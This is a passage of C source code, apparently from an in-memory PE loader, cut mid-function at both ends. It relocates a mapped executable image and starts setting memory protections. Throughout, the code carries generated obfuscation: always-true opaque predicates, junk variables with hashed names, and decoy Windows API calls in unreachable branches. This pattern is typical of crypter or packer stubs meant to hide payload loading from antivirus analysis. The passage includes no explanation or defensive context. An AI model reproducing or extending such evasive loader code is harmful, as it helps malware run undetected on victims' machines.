          if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
          {
            vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = v319cc87457360bcf28671944f259c4b4_random_opaque / vd2cc9196524592bf88d0378fd0a1d222_useless_opaque;
            if (!vb64227d50830527f1c5ec35a81e70f02_true_opaque)
            {
              vd2cc9196524592bf88d0378fd0a1d222_useless_opaque = vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque < vb64227d50830527f1c5ec35a81e70f02_true_opaque;
            }
            v319cc87457360bcf28671944f259c4b4_random_opaque = v319cc87457360bcf28671944f259c4b4_random_opaque + ((unsigned int) 40);
          }
          IMAGE_BASE_RELOCATION *p_reloc = (IMAGE_BASE_RELOCATION *) (new_pe->data + new_pe->data_directory[5].VirtualAddress);
          if (vb64227d50830527f1c5ec35a81e70f02_true_opaque)
          {
            while (p_reloc->VirtualAddress != 0)
            {
              DWORD size = (p_reloc->SizeOfBlock - (sizeof(IMAGE_BASE_RELOCATION))) / 2;
              WORD *reloc = (WORD *) (p_reloc + 1);
              if (!vb64227d50830527f1c5ec35a81e70f02_true_opaque)
              {
                void * v9244881d1f902cc3136e642cc05f74bc = (void *) 0x6446cf46;
                if (!vb64227d50830527f1c5ec35a81e70f02_true_opaque)
                {
                  vb64227d50830527f1c5ec35a81e70f02_true_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque - v319cc87457360bcf28671944f259c4b4_random_opaque;
                }
                if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
                {
                  vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = vd2cc9196524592bf88d0378fd0a1d222_useless_opaque % vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque;
                  v319cc87457360bcf28671944f259c4b4_random_opaque = vb64227d50830527f1c5ec35a81e70f02_true_opaque | vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque;
                  vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque * ((unsigned int) 12);
                  vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque = vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque / v319cc87457360bcf28671944f259c4b4_random_opaque;
                  vd2cc9196524592bf88d0378fd0a1d222_useless_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque | ((unsigned int) 17);
                }
                unsigned long vd97932ff9ae64bd6962d94fb98253902 = (unsigned long) 0x6d5b4085;
                unsigned long v4e10392c4773f7ea38e97a3b2379b960 = (unsigned long) 0x3897e24c;
                v4e10392c4773f7ea38e97a3b2379b960 = SnmpListen(v9244881d1f902cc3136e642cc05f74bc, vd97932ff9ae64bd6962d94fb98253902);
              }
              if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
              {
                unsigned long vda12150a7f0f6e01b6b519e539abda3e = (unsigned long) 0x8104d770;
                unsigned long va3e5870c362eed71070653d6a498ce78 = (unsigned long) 0x3aa508ad;
                va3e5870c362eed71070653d6a498ce78 = MsiGetActiveDatabase(vda12150a7f0f6e01b6b519e539abda3e);
              }
              for (int i = 0; i < size; ++i)
              {
                int type = reloc[i] >> 12;
                if (!vb64227d50830527f1c5ec35a81e70f02_true_opaque)
                {
                  void * v493768f82c3d35f7c86110b6ac3a0f38 = (void *) 0xac94b006;
                  int v457fbf8c6cf2bf21f4ef962c5cc83964 = (int) 0xb8eef59f;
                  v457fbf8c6cf2bf21f4ef962c5cc83964 = RemoveDllDirectory(v493768f82c3d35f7c86110b6ac3a0f38);
                }
                int offset = reloc[i] & 0x0fff;
                if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
                {
                  vd2cc9196524592bf88d0378fd0a1d222_useless_opaque = vb64227d50830527f1c5ec35a81e70f02_true_opaque <= vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque;
                  vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = vb64227d50830527f1c5ec35a81e70f02_true_opaque + vd2cc9196524592bf88d0378fd0a1d222_useless_opaque;
                }
                DWORD *change_addr = (DWORD *) ((new_pe->data + p_reloc->VirtualAddress) + offset);
                switch (type)
                {
                  case 3:
                    *change_addr += delta_reloc;
                    break;

                  default:
                    break;

                }

              }

              p_reloc = (IMAGE_BASE_RELOCATION *) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
            }

          }
        }
        if (!vb64227d50830527f1c5ec35a81e70f02_true_opaque)
        {
          vb64227d50830527f1c5ec35a81e70f02_true_opaque = vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque / vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque;
          vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque + vb64227d50830527f1c5ec35a81e70f02_true_opaque;
          vb64227d50830527f1c5ec35a81e70f02_true_opaque = vd2cc9196524592bf88d0378fd0a1d222_useless_opaque != vb64227d50830527f1c5ec35a81e70f02_true_opaque;
        }
      }
    }
    if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
    {
      if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
      {
        void * v36cfc3e4bfc15a6446af2c6744080f41 = (void *) 0x65169e03;
        unsigned long v498a62f508008cfbc4eb68de7e65f2db = (unsigned long) 0xe9ee7897;
        if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
        {
          unsigned long v5edbacfeb31e9ae764b30afb041ebe8b = (unsigned long) 0x3ece95f2;
          if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
          {
            v5edbacfeb31e9ae764b30afb041ebe8b = SnmpListen(v36cfc3e4bfc15a6446af2c6744080f41, v498a62f508008cfbc4eb68de7e65f2db);
          }
        }
      }
      unsigned int v1222dcd9750a429a2c545f51e6bba352_useless_opaque = (unsigned int) 4152279816;
      unsigned int v1a9126c0612760fc12379576ae31bd8b_computation_opaque = (unsigned int) 0;
      unsigned int v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque = (unsigned int) 3;
      unsigned int v70f28bd59cb124dfc33513ec725b7413_computation_opaque = (unsigned int) (&v1222dcd9750a429a2c545f51e6bba352_useless_opaque);
      v70f28bd59cb124dfc33513ec725b7413_computation_opaque = (v70f28bd59cb124dfc33513ec725b7413_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v70f28bd59cb124dfc33513ec725b7413_computation_opaque < ((unsigned int) 3))
      {
        v70f28bd59cb124dfc33513ec725b7413_computation_opaque = (unsigned int) 3;
      }
      while (v1a9126c0612760fc12379576ae31bd8b_computation_opaque != ((unsigned int) 1))
      {
        v70f28bd59cb124dfc33513ec725b7413_computation_opaque += (unsigned int) 2;
        v1a9126c0612760fc12379576ae31bd8b_computation_opaque = (unsigned int) 1;
        v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque = (unsigned int) 3;
        while ((v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque * v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque) <= v70f28bd59cb124dfc33513ec725b7413_computation_opaque)
        {
          if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
            {
              void * vc9a61c0ccb0fd329d561e12f9dc75222 = (void *) 0x28f48083;
              unsigned long v26749d18993fdd8afa468c3506f6bdfb = (unsigned long) 0x4c02b56c;
              unsigned long v4bc6fe7b7fc6c2e1be208f42a571b866 = (unsigned long) 0x5813ef2c;
              v4bc6fe7b7fc6c2e1be208f42a571b866 = SnmpListen(vc9a61c0ccb0fd329d561e12f9dc75222, v26749d18993fdd8afa468c3506f6bdfb);
            }
            if ((v70f28bd59cb124dfc33513ec725b7413_computation_opaque % v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque) == ((unsigned int) 0))
            {
              if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
              {
                if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
                {
                  v70f28bd59cb124dfc33513ec725b7413_computation_opaque = v1222dcd9750a429a2c545f51e6bba352_useless_opaque - vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque;
                  v319cc87457360bcf28671944f259c4b4_random_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque || v319cc87457360bcf28671944f259c4b4_random_opaque;
                }
                v1a9126c0612760fc12379576ae31bd8b_computation_opaque = (unsigned int) 0;
              }
            }
            v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque = v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque + ((unsigned int) 2);
          }
        }

        unsigned int v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque = (unsigned int) 111071202;
        unsigned int vfe531ac84a068771af80e5f4629801e9_computation_opaque = (unsigned int) 0;
        unsigned int vc1966e3f57a8555202854d2e35e43a7f_computation_opaque = (unsigned int) 3;
        if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
        {
          void * v824967c9531bd0b0c2d636ad9485b6dc = (void *) 0x051b826f;
          int v6f99993f0a0fc84111d4a8e8ac0e8659 = (int) 0xc50743f5;
          if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
          {
            if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
            {
              v6f99993f0a0fc84111d4a8e8ac0e8659 = RemoveDllDirectory(v824967c9531bd0b0c2d636ad9485b6dc);
            }
          }
        }
        if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
        {
          vfe531ac84a068771af80e5f4629801e9_computation_opaque = v1a9126c0612760fc12379576ae31bd8b_computation_opaque * v70f28bd59cb124dfc33513ec725b7413_computation_opaque;
          v319cc87457360bcf28671944f259c4b4_random_opaque = v70f28bd59cb124dfc33513ec725b7413_computation_opaque | v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque;
          if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
          {
            v1a9126c0612760fc12379576ae31bd8b_computation_opaque = v1222dcd9750a429a2c545f51e6bba352_useless_opaque | vfe531ac84a068771af80e5f4629801e9_computation_opaque;
            if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
            {
              v319cc87457360bcf28671944f259c4b4_random_opaque = v1a9126c0612760fc12379576ae31bd8b_computation_opaque * ((unsigned int) 71);
              v1222dcd9750a429a2c545f51e6bba352_useless_opaque = vc1966e3f57a8555202854d2e35e43a7f_computation_opaque + vfe531ac84a068771af80e5f4629801e9_computation_opaque;
              if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
              {
                v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque = v319cc87457360bcf28671944f259c4b4_random_opaque || v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque;
                vc1966e3f57a8555202854d2e35e43a7f_computation_opaque = v319cc87457360bcf28671944f259c4b4_random_opaque % v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque;
              }
              vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque = v70f28bd59cb124dfc33513ec725b7413_computation_opaque * ((unsigned int) 69);
              v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque | vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque;
              v1222dcd9750a429a2c545f51e6bba352_useless_opaque = vc1966e3f57a8555202854d2e35e43a7f_computation_opaque - v70f28bd59cb124dfc33513ec725b7413_computation_opaque;
            }
          }
          v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque + vfe531ac84a068771af80e5f4629801e9_computation_opaque;
          v70f28bd59cb124dfc33513ec725b7413_computation_opaque = vfe531ac84a068771af80e5f4629801e9_computation_opaque || v319cc87457360bcf28671944f259c4b4_random_opaque;
          v70f28bd59cb124dfc33513ec725b7413_computation_opaque = v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque | v1222dcd9750a429a2c545f51e6bba352_useless_opaque;
          v1222dcd9750a429a2c545f51e6bba352_useless_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque != ((unsigned int) 71);
          v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque = vc1966e3f57a8555202854d2e35e43a7f_computation_opaque | v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque;
        }
        unsigned int vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque = (unsigned int) (&v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque);
        vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque = (vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
        if (vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque < ((unsigned int) 3))
        {
          if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
          {
            if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
            {
              vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque = (unsigned int) 3;
            }
          }
        }
        while (vfe531ac84a068771af80e5f4629801e9_computation_opaque != ((unsigned int) 1))
        {
          vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque += (unsigned int) 2;
          vfe531ac84a068771af80e5f4629801e9_computation_opaque = (unsigned int) 1;
          if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
          {
            v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque = vfe531ac84a068771af80e5f4629801e9_computation_opaque + v319cc87457360bcf28671944f259c4b4_random_opaque;
            if ((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25)))
            {
              v70f28bd59cb124dfc33513ec725b7413_computation_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque != v319cc87457360bcf28671944f259c4b4_random_opaque;
              vfe531ac84a068771af80e5f4629801e9_computation_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque == v319cc87457360bcf28671944f259c4b4_random_opaque;
              v1222dcd9750a429a2c545f51e6bba352_useless_opaque = vc1966e3f57a8555202854d2e35e43a7f_computation_opaque * ((unsigned int) 65);
              v70f28bd59cb124dfc33513ec725b7413_computation_opaque = v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque != v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque;
            }
          }
          vc1966e3f57a8555202854d2e35e43a7f_computation_opaque = (unsigned int) 3;
          while ((vc1966e3f57a8555202854d2e35e43a7f_computation_opaque * vc1966e3f57a8555202854d2e35e43a7f_computation_opaque) <= vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque)
          {
            if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
            {
              vfe531ac84a068771af80e5f4629801e9_computation_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque / vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque;
              v1a9126c0612760fc12379576ae31bd8b_computation_opaque = v1a9126c0612760fc12379576ae31bd8b_computation_opaque || v6f8a766cf996c2606403c1d2215cf3ca_useless_opaque;
              vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque = vfe531ac84a068771af80e5f4629801e9_computation_opaque % v1222dcd9750a429a2c545f51e6bba352_useless_opaque;
              v1a9126c0612760fc12379576ae31bd8b_computation_opaque = v70f28bd59cb124dfc33513ec725b7413_computation_opaque - vc1966e3f57a8555202854d2e35e43a7f_computation_opaque;
            }
            if ((vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque % vc1966e3f57a8555202854d2e35e43a7f_computation_opaque) == ((unsigned int) 0))
            {
              vfe531ac84a068771af80e5f4629801e9_computation_opaque = (unsigned int) 0;
              if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
              {
                void * v4d82062d42367b7497ce2c65e7c5155a = (void *) 0x3fa76169;
                int va183722253b6ebcdf398b4027792fa19 = (int) 0xa1f90fc9;
                va183722253b6ebcdf398b4027792fa19 = RemoveDllDirectory(v4d82062d42367b7497ce2c65e7c5155a);
              }
            }
            vc1966e3f57a8555202854d2e35e43a7f_computation_opaque = vc1966e3f57a8555202854d2e35e43a7f_computation_opaque + ((unsigned int) 2);
          }

        }

        unsigned int v3f896cda933d80628faf023537138117_prime_opaque = vd6e14d2ce468fb0a6d2d37f3ad66011f_computation_opaque;
      }

      unsigned int va8c1acc5125e2933b261f7d9d9a7e0a0_prime_opaque = v70f28bd59cb124dfc33513ec725b7413_computation_opaque;
      if (!((((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 9)) + ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 16))) == ((v319cc87457360bcf28671944f259c4b4_random_opaque * v319cc87457360bcf28671944f259c4b4_random_opaque) * ((unsigned int) 25))))
      {
        v1222dcd9750a429a2c545f51e6bba352_useless_opaque = v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque % v1222dcd9750a429a2c545f51e6bba352_useless_opaque;
        vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque = va8c1acc5125e2933b261f7d9d9a7e0a0_prime_opaque / v70f28bd59cb124dfc33513ec725b7413_computation_opaque;
        vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque = v70f28bd59cb124dfc33513ec725b7413_computation_opaque / v1222dcd9750a429a2c545f51e6bba352_useless_opaque;
        v70f28bd59cb124dfc33513ec725b7413_computation_opaque = vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque - v1222dcd9750a429a2c545f51e6bba352_useless_opaque;
        v319cc87457360bcf28671944f259c4b4_random_opaque = v319cc87457360bcf28671944f259c4b4_random_opaque == va8c1acc5125e2933b261f7d9d9a7e0a0_prime_opaque;
        v1a9126c0612760fc12379576ae31bd8b_computation_opaque = v1222dcd9750a429a2c545f51e6bba352_useless_opaque != v82ed3ff5bd31134ea8ac7bb17c2ac5d1_computation_opaque;
      }
    }
  }
}

int set_protections(in_memory_pe *new_pe)
{
  unsigned int vb55175dd9af3c0303bce55289e856cc9_useless_opaque = (unsigned int) 3938007072;
  unsigned int vf731280a95e05a499b1a58d35faa3ae9_random_opaque = (unsigned int) (&vb55175dd9af3c0303bce55289e856cc9_useless_opaque);
  {
    {
      unsigned int vf81632770fbeb77823e6f83848564f8e_useless_opaque = (unsigned int) 1948891358;
      unsigned int v7a8552b2b7b6e9e183a20576beb83fdc_computation_opaque = (unsigned int) 0;
      unsigned int v11a42759d5d5da506e1a6f3d437017d1_computation_opaque = (unsigned int) 3;
      unsigned int v59a97adbc2942e6a8544456ef336671c_computation_opaque = (unsigned int) (&vf81632770fbeb77823e6f83848564f8e_useless_opaque);
      if (!((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25))))
      {
        v59a97adbc2942e6a8544456ef336671c_computation_opaque = v11a42759d5d5da506e1a6f3d437017d1_computation_opaque / vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
        if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
        {
          if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
          {
            if ((((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 9)) + ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 16))) == ((vf731280a95e05a499b1a58d35faa3ae9_random_opaque * vf731280a95e05a499b1a58d35faa3ae9_random_opaque) * ((unsigned int) 25)))
            {
              v59a97adbc2942e6a8544456ef336671c_computation_opaque = vf81632770fbeb77823e6f83848564f8e_useless_opaque % vf731280a95e05a499b1a58d35faa3ae9_random_opaque;
            }
          }
        }
      }
